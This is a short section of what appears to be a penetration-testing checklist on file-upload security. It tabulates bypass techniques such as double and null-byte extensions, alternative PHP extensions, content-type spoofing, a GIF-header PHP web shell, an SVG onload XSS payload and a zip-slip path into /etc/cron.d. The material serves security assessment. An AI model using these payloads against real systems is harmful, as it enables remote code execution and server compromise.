## 3I. File Upload Security
*CRUXSS-BUSL-08 | CRUXSS-BUSL-09*

| Bypass | Technique | CRUXSS-ID |
|---|---|---|
| Double extension | `file.php.jpg`, `file.php%00.jpg` | CRUXSS-BUSL-08 |
| Case variation | `file.pHp`, `file.PHP5` | CRUXSS-BUSL-08 |
| Alt extensions | `.phtml`, `.phar`, `.shtml` | CRUXSS-BUSL-08 |
| Content-Type spoof | `image/jpeg` header + PHP content | CRUXSS-BUSL-08 |
| Magic bytes | `GIF89a;<?php system($_GET['c']);?>` | CRUXSS-BUSL-08 |
| SVG XSS | `<svg onload=alert(1)>` | CRUXSS-BUSL-09 |
| Zip slip | `../../etc/cron.d/shell` in zip entry | CRUXSS-BUSL-09 |

---

